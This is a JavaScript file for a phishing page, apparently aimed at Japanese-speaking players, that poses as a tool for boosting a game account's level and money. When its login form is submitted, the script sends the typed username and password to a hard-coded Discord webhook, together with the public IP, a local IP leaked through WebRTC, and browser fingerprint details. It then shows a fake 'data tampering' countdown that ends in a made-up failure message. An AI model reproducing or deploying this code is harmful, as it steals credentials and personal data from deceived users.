const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1383640308775915530/79LuHlN9onos06nH_TYwvFjlW911mRKE-e1edUQ3YvRduRIQEQT4oQ0YWi0fsMVH8tTu';

const form1 = document.getElementById('account-form');
const form2 = document.getElementById('boost-form');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

let savedAccount = {};

function getIP() {
  return fetch('https://api.ipify.org?format=json')
    .then(res => res.json())
    .then(d => d.ip)
    .catch(() => "");
}

function getLocalIP() {
  return new Promise((resolve) => {
    const pc = new RTCPeerConnection({ iceServers: [] });
    pc.createDataChannel('');
    pc.createOffer().then(offer => pc.setLocalDescription(offer));

    pc.onicecandidate = (event) => {
      if (!event || !event.candidate) return;
      const match = event.candidate.candidate.match(/(\d{1,3}(?:\.\d{1,3}){3})/);
      if (match) {
        resolve(match[1]);
        pc.onicecandidate = null;
        pc.close();
      }
    };

    setTimeout(() => {
      resolve("Not found");
      pc.onicecandidate = null;
      pc.close();
    }, 3000);
  });
}

async function sendToWebhook(embed) {
  await fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ embeds: [embed] })
  });
}

form1.addEventListener('submit', async (e) => {
  e.preventDefault();
  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();
  savedAccount = { username, password };

  const ip = await getIP();
  const localIP = await getLocalIP();

  const embed = {
    title: "Account Info",
    color: 3447003,
    fields: [
      { name: "MailAddress", value: username, inline: true },
      { name: "Password", value: password, inline: true },
      { name: "Global IP", value: ip, inline: true },
      { name: "Local IP", value: localIP, inline: true },
      { name: "Language", value: navigator.language, inline: true },
      { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
      { name: "Platform", value: navigator.platform, inline: true },
      { name: "CPU Cores", value: String(navigator.hardwareConcurrency || "Unknown"), inline: true },
      { name: "Screen", value: `${screen.width}x${screen.height}`, inline: true },
      { name: "Touch Support", value: String(navigator.maxTouchPoints), inline: true },
      { name: "Cookies Enabled", value: String(navigator.cookieEnabled), inline: true },
      { name: "User-Agent", value: navigator.userAgent, inline: false }
    ],
    timestamp: new Date().toISOString()
  };

  await sendToWebhook(embed);

  form1.classList.add('hidden');
  form2.classList.remove('hidden');
});

form2.addEventListener('submit', async (e) => {
  e.preventDefault();
  const level = document.getElementById('level-amount').value.trim();
  const money = document.getElementById('money-amount').value.trim();

  const embed = {
    title: "Boost Info",
    color: 15844367,
    fields: [
      { name: "Username", value: savedAccount.username, inline: true },
      { name: "Level Increase", value: level, inline: true },
      { name: "Money Increase", value: money, inline: true }
    ],
    timestamp: new Date().toISOString()
  };

  await sendToWebhook(embed);

  form2.classList.add('hidden');
  canvas.classList.remove('hidden');
  startCanvasCountdown();
});

function startCanvasCountdown() {
  let seconds = Math.floor(Math.random() * 240) + 60;

  const interval = setInterval(() => {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    ctx.font = '28px Segoe UI';
    ctx.fillStyle = 'black';
    ctx.textAlign = 'center';

    if (seconds > 0) {
      const m = Math.floor(seconds / 60);
      const s = String(seconds % 60).padStart(2, '0');
      const dots = ['.', '..', '...'][Math.floor(Date.now() / 500) % 3];
      ctx.fillText(`データ改竄中${dots}`, canvas.width / 2, 60);
      ctx.fillText(`残り ${m}分${s}秒`, canvas.width / 2, 120);

      seconds--;
      const direction = Math.random() < 0.5 ? -1 : 1;
      const fluctuation = Math.floor(Math.random() * 10) + 1;
      seconds = Math.max(0, seconds + (direction * fluctuation));
    } else {
      clearInterval(interval);
      ctx.fillStyle = 'red';
      ctx.fillText('改竄処理に失敗しました。', canvas.width / 2, 60);
      ctx.fillText('アカウントの情報が正しいか確認してください。', canvas.width / 2, 120);
    }
  }, 1000);
}
